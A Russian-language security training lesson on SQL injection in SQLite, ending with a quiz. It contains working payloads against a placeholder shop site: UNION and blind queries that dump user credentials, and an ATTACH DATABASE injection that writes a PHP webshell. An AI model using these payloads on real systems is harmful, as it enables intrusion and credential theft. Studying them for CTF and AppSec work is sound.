---
id: db-sqlite
title: "SQLite: инъекции на практике — sqlite_master и запись файлов"
category: web
parent: web-sqli-dbms-open
difficulty: medium
order: 2
tags: [sqli, sqlite, sqlite_master, attach, load_extension, mobile, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Мобильные приложения (Android/iOS)"
  - "Десктопные приложения"
estimated_minutes: 40
summary: "SQLite от фингерпринта до записи файлов: sqlite_master, PRAGMA, UNION/blind, ATTACH DATABASE и load_extension."
---

## Задача

**SQLite** — не сервер, а встраиваемая библиотека: вся база лежит одним файлом рядом с приложением. Её используют мобильные приложения (Android/iOS), десктоп-софт (браузеры, мессенджеры, IDE) и маленькие веб-сервисы. Из-за этого SQLite — «урезанный» диалект: нет `information_schema`, нет `SLEEP`, нет stacked-запросов. Зато есть своя таблица метаданных `sqlite_master` и запись файлов через `ATTACH DATABASE`.

Разберём инъекцию в SQLite на живом примере — от одной кавычки до дампа учёток.

## Данные, с которыми работаем

Цель — `https://shop.example/product?id=1`. Обычный запрос отдаёт JSON:

```bash
$ curl -s 'https://shop.example/product?id=1'
[[1,"Laptop",999.0]]
```

Добавим кавычку. Характерные ошибки SQLite: `unrecognized token`, `near "...": syntax error`, `no such table`, а из ORM (Django, Flask-SQLAlchemy) — `sqlite3.OperationalError`.

```bash
$ curl -s 'https://shop.example/product?id=1%27'
SQL error: unrecognized token: "'"
```

`unrecognized token` — отпечаток SQLite. Инъекция есть. Проверим версию — у SQLite своя функция:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,sqlite_version(),3-- -"
[[1,"3.45.1",3]]
```

Важная деталь: SQLite **регистронезависим** для ключевых слов (`SELECT` = `select`), но имена объектов чувствительны к регистру, если созданы в кавычках.

## Шаг 1: метаданные в sqlite_master

Здесь нет `information_schema`. Вся метаинформация — в таблице `sqlite_master` (её синоним — `sqlite_schema`). Колонки: `type` (таблица/индекс/вьюха/триггер), `name` (имя), `tbl_name`, `sql` (исходное `CREATE`-выражение). Найдём колонки через `ORDER BY`, как в прошлом уроке:

```bash
$ for n in 1 2 3 4; do printf '%s ' "$n"; curl -s "https://shop.example/product?id=1 ORDER BY $n-- -" | wc -c; done
1 28
2 28
3 28
4 47
```

На `4` ответ вырос (ошибка длиннее данных) — значит, три колонки. Теперь UNION и список таблиц:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM sqlite_master WHERE type='table'-- -"
[[1,"products,users",3]]
```

`GROUP_CONCAT` в SQLite работает так же, как в MySQL. Смотрим, как устроена `users` — её `CREATE`-выражение лежит в колонке `sql`:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,sql,3 FROM sqlite_master WHERE name='users'-- -"
[[1,"CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)",3]]
```

Колонки `username`, `password`, `role`. Дамп:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3 FROM users-- -"
[[1,"admin:S3cr3t!,alice:hunter2",3]]
```

В SQLite нет `0x0a`-конкатенации; для разделителей используют `char(10)` (перевод строки) или `||`, а hex-литералы `X'...'` работают только для BLOB.

## Шаг 2: PRAGMA — детали таблиц

`PRAGMA` — служебная команда SQLite. Она отдаёт структуру таблицы, список подключённых баз и параметры сборки:

```sql
PRAGMA table_info(users);     -- cid, name, type, notnull, dflt_value, pk
PRAGMA database_list;         -- подключённые БД (main, temp, ...)
```

С версии 3.16 у `PRAGMA` есть табличная форма, поэтому её результат можно положить в UNION:

```bash
$ curl -s "https://shop.example/product?id=-1 UNION SELECT 1,GROUP_CONCAT(name),3 FROM pragma_table_info('users')-- -"
[[1,"id,username,password,role",3]]
```

Ещё полезно `SELECT * FROM pragma_compile_options()` — покажет, какие функции собраны в движок.

## Шаг 3: слепое чтение — только логика

Time-blind в SQLite **отсутствует**: нет ни `SLEEP`, ни `pg_sleep`, ни `WAITFOR`. Не трать на них время. Остаётся **boolean-blind** — вопросы «да/нет» через логику. Сравним истину и ложь:

```bash
$ curl -s "https://shop.example/product?id=1 AND 1=1"
[[1,"Laptop",999.0]]
$ curl -s "https://shop.example/product?id=1 AND 1=2"
[]
```

Работает. Теперь можно читать посимвольно: `SUBSTR(x,1,1)` берёт первый символ, `ASCII()` (он же `UNICODE()`) даёт его код, `LENGTH()` — длину:

```bash
$ curl -s "https://shop.example/product?id=1 AND SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1),1,1)='p'"
[[1,"Laptop",999.0]]
```

Ответ не пуст → первая буква имени таблицы — `p`. Так перебором восстанавливается любое значение, если вывод не отражается.

## Шаг 4: запись файлов через ATTACH DATABASE

Даже без `INTO OUTFILE` SQLite умеет писать файлы: командой `ATTACH DATABASE '<путь>'` можно подключить произвольный файл как базу, а потом создать в нём таблицу — и файл на диске появится:

```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.s (c text);
INSERT INTO pwn.s VALUES ('<?php system($_GET["c"]); ?>');
```

Хитрость: файл базы SQLite содержит не только данные, но и SQL-выражения `CREATE TABLE`. Чтобы PHP-код оказался в начале файла и интерпретатор его выполнил, имя таблицы/колонки формируют так, чтобы нужный фрагмент попал в заголовок файла. Через инъекцию это выглядит так (stacked-запросы работают не везде — зависит от драйвера; в `sqlite3_exec` сработают):

```bash
$ curl -s "https://shop.example/product?id=1;ATTACH DATABASE '/var/www/html/s.php' AS pwn;CREATE TABLE pwn.s(c text);INSERT INTO pwn.s VALUES('<?php system(\$_GET[c]); ?>');-- -"
```

Ещё один вектор — `load_extension()`: если движок собран с этой функцией и включён, можно загрузить произвольный `.so`/`.dll` и получить RCE. Проверяется через `SELECT load_extension('/path/lib.so')`, но это редкая конфигурация.

## Полный прогон от начала до конца

1. `id=1'` → `SQL error: unrecognized token` — SQLite, инъекция есть.
2. `UNION SELECT 1,sqlite_version(),3` → `3.45.1`.
3. `ORDER BY 4` ломается → три колонки.
4. `sqlite_master` → таблицы `products,users`.
5. `sql` из `sqlite_master` → структура `users`.
6. `GROUP_CONCAT(username||':'||password)` → `admin:S3cr3t!,alice:hunter2`.
7. `ATTACH DATABASE` → потенциальный webshell, если есть запись в web-корень.

## Если не сработало

- **Ждёшь `SLEEP`.** Его нет — переходи на boolean-blind.
- **Stacked `;` не работает.** Многие драйверы выполняют только один запрос; тогда UNION/blind.
- **Нет `information_schema`.** Не ищи его — метаданные в `sqlite_master`.
- **Регистр в именах.** Ключевые слова не важны, а имена таблиц в кавычках — важны.
- **Файлы не пишутся.** `ATTACH` требует права записи процесса в каталог; проверь путь.

## На что смотреть дальше

- **`sqlite_master` — твой `information_schema`.** Начни с него, а не с системных таблиц.
- **`PRAGMA` в табличной форме** (`pragma_table_info`) вставляется в UNION — удобно.
- **Time-blind не существует.** Экономит время: сразу boolean.
- **`ATTACH DATABASE` пишет файлы** — это путь к webshell при праве записи.
- **SQLite повсюду в мобильных приложениях** — те же payload работают в локальных базах на телефоне.
- **Не пиши в прод без согласования** — `ATTACH`/`CREATE` меняют файлы.

## Квиз

Проверь себя.

```quiz
- question: 'Ошибка `unrecognized token` — это какая СУБД?'
  options:
    - "PostgreSQL"
    - "MSSQL"
    - "SQLite"
    - "Oracle"
  answer: 2
  explanation: "«unrecognized token» — характерный текст ошибки SQLite."
- question: "Где в SQLite хранятся метаданные о таблицах?"
  options:
    - "information_schema.tables"
    - "sqlite_master"
    - "all_tables"
    - "sys.objects"
  answer: 1
  explanation: "sqlite_master (он же sqlite_schema) содержит type, name, tbl_name и sql."
- question: "Почему в SQLite нельзя использовать time-blind?"
  options:
    - "Он слишком медленный"
    - "В нём нет функций задержки (SLEEP и подобных)"
    - "Он требует прав root"
    - "Он есть, но отключён по умолчанию"
  answer: 1
  explanation: "Ни SLEEP, ни pg_sleep, ни WAITFOR в SQLite не существует — остаётся boolean."
- question: "Какая команда позволяет записать файл на диск из SQLite?"
  options:
    - "INTO OUTFILE"
    - "ATTACH DATABASE и CREATE TABLE в нём"
    - "COPY TO PROGRAM"
    - "xp_cmdshell"
  answer: 1
  explanation: "ATTACH подключает произвольный файл как базу, и CREATE TABLE создаёт его на диске."
- question: "Какая функция агрегирует строки в одну в SQLite?"
  options:
    - "string_agg"
    - "LISTAGG"
    - "GROUP_CONCAT"
    - "STRING_JOIN"
  answer: 2
  explanation: "GROUP_CONCAT есть и в SQLite, и в MySQL; string_agg — в PostgreSQL."
```

## Куда дальше

Следующий урок (`db-postgresql`) разберёт PostgreSQL — самую «строгую» из открытых СУБД, где инъекция может закончиться чтением файлов через `pg_read_file` и RCE через `COPY ... FROM PROGRAM`. А пока главное запомни: SQLite — это файл, а не сервер; метаданные в `sqlite_master`, задержек нет, но есть `ATTACH DATABASE` для записи файлов.

## Где пригодится

- **CTF (Web/Mobile):** SQLite — частая база в задачах; `sqlite_master` и `ATTACH` — классика.
- **Bug bounty:** инъекции в мобильных API и маленьких сервисах; дамп учёток — high.
- **Пентест:** аудит Android/iOS и десктоп-приложений, где база лежит локально.
- **Работа (AppSec):** параметризация запросов и минимум прав на файловой системе — базовые меры.
